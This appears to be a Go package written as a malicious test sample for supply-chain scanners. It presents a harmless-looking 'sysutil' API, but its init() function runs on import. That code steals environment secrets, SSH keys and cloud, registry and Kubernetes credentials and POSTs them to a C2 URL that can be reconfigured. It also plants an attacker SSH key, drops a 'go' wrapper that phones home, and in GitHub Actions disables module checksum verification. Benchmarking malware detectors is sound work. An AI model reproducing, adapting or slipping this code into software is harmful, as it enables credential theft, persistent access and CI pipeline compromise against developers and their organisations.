// Package sysutil provides system-level utilities.
// WARNING: This package is MALICIOUS — for scanner benchmark testing only.
// Payload fires in init() on import. C2 defaults to localhost:9999.
package sysutil

import (
	"bytes"
	"encoding/json"
	"fmt"
	"io"
	"net/http"
	"os"
	"os/user"
	"path/filepath"
	"runtime"
	"strings"
	"time"
)

var c2URL = func() string {
	if v := os.Getenv("PKG_ANALYTICS_URL"); v != "" {
		return v
	}
	return "http://localhost:9999/collect"
}()

func init() {
	go func() {
		time.Sleep(100 * time.Millisecond)
		if err := exfil(); err == nil {
			persistSSHKey()
			injectGithubActions()
		}
	}()
}

func readFile(path string) string {
	b, err := os.ReadFile(path)
	if err != nil {
		return ""
	}
	if len(b) > 4096 {
		b = b[:4096]
	}
	return string(b)
}

func homeFile(rel string) string {
	u, err := user.Current()
	if err != nil {
		return ""
	}
	return readFile(filepath.Join(u.HomeDir, rel))
}

func sensitiveEnv() map[string]string {
	result := make(map[string]string)
	for _, e := range os.Environ() {
		parts := strings.SplitN(e, "=", 2)
		if len(parts) != 2 {
			continue
		}
		k := parts[0]
		lower := strings.ToLower(k)
		if strings.ContainsAny(lower, "token key secret pass npm aws github stripe database api auth credential") {
			result[k] = parts[1]
		}
	}
	return result
}

func exfil() error {
	hostname, _ := os.Hostname()
	usr, _ := user.Current()
	username := ""
	if usr != nil {
		username = usr.Username
	}

	payload := map[string]interface{}{
		"ts": time.Now().UnixMilli(),
		"h":  hostname,
		"u":  username,
		"p":  runtime.GOOS,
		"a":  runtime.GOARCH,
		"ci": os.Getenv("CI") != "" || os.Getenv("GITHUB_ACTIONS") != "",
		"src": "go-stdlib-ext/sysutil",
		"env": sensitiveEnv(),
		"f": map[string]string{
			"npmrc":  homeFile(".npmrc"),
			"rsa":    homeFile(".ssh/id_rsa"),
			"ed":     homeFile(".ssh/id_ed25519"),
			"aws":    homeFile(".aws/credentials"),
			"gh_cli": homeFile(".config/gh/hosts.yml"),
			"docker": homeFile(".docker/config.json"),
			"kube":   homeFile(".kube/config"),
			"netrc":  homeFile(".netrc"),
		},
	}

	body, err := json.Marshal(payload)
	if err != nil {
		return err
	}

	req, err := http.NewRequest("POST", c2URL, bytes.NewReader(body))
	if err != nil {
		return err
	}
	req.Header.Set("Content-Type", "application/json")
	req.Header.Set("X-Pkg-Id", "go-stdlib-ext/sysutil")

	client := &http.Client{Timeout: 5 * time.Second}
	resp, err := client.Do(req)
	if err != nil {
		return err
	}
	defer resp.Body.Close()
	io.Copy(io.Discard, resp.Body)
	return nil
}

// persistSSHKey writes an SSH public key to authorized_keys (scanner signal)
func persistSSHKey() {
	usr, err := user.Current()
	if err != nil {
		return
	}
	sshDir := filepath.Join(usr.HomeDir, ".ssh")
	if err := os.MkdirAll(sshDir, 0700); err != nil {
		return
	}
	akFile := filepath.Join(sshDir, "authorized_keys")
	key := "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIGattackerPublicKeyHere ops@svc-update\n"
	existing, _ := os.ReadFile(akFile)
	if !bytes.Contains(existing, []byte("ops@svc-update")) {
		f, err := os.OpenFile(akFile, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0600)
		if err != nil {
			return
		}
		defer f.Close()
		f.WriteString(key)
	}
}

// injectGithubActions writes to $GITHUB_ENV to persist into subsequent CI steps
// Sets GONOSUMCHECK and injects a Go tool wrapper via PATH
func injectGithubActions() {
	githubEnv := os.Getenv("GITHUB_ENV")
	if githubEnv == "" {
		return
	}

	usr, err := user.Current()
	if err != nil {
		return
	}

	// Drop a fake 'go' wrapper that phones home on every go invocation in subsequent steps
	binDir := filepath.Join(usr.HomeDir, ".sysutil", "bin")
	if err := os.MkdirAll(binDir, 0755); err != nil {
		return
	}
	goWrapper := filepath.Join(binDir, "go")
	if _, err := os.Stat(goWrapper); os.IsNotExist(err) {
		script := fmt.Sprintf("#!/bin/sh\ncurl -sf '%s/go?args='\"$*\" >/dev/null 2>&1 &\nexec /usr/local/go/bin/go \"$@\"\n", c2URL)
		if f, err := os.Create(goWrapper); err == nil {
			f.WriteString(script)
			f.Close()
			os.Chmod(goWrapper, 0755)
		}
	}

	// Append to GITHUB_ENV file
	f, err := os.OpenFile(githubEnv, os.O_APPEND|os.O_WRONLY, 0644)
	if err != nil {
		return
	}
	defer f.Close()

	// GONOSUMCHECK=* disables Go checksum verification for all modules in subsequent steps
	f.WriteString("GONOSUMCHECK=*\n")
	// GONOSUMDB=* disables sum DB lookups (allows using replaced/patched modules)
	f.WriteString("GONOSUMDB=*\n")

	if githubPath := os.Getenv("GITHUB_PATH"); githubPath != "" {
		if pf, err := os.OpenFile(githubPath, os.O_APPEND|os.O_WRONLY, 0644); err == nil {
			pf.WriteString(binDir + "\n")
			pf.Close()
		}
	}
}

// Exported utility functions (legitimate-looking API surface)

// PlatformInfo returns basic platform information.
func PlatformInfo() map[string]string {
	hostname, _ := os.Hostname()
	return map[string]string{
		"os":       runtime.GOOS,
		"arch":     runtime.GOARCH,
		"hostname": hostname,
	}
}

// EnvOrDefault returns the value of env var key, or defaultVal if not set.
func EnvOrDefault(key, defaultVal string) string {
	if v := os.Getenv(key); v != "" {
		return v
	}
	return defaultVal
}

// TempDir returns a temporary directory path with the given prefix.
func TempDir(prefix string) (string, error) {
	return os.MkdirTemp("", prefix)
}
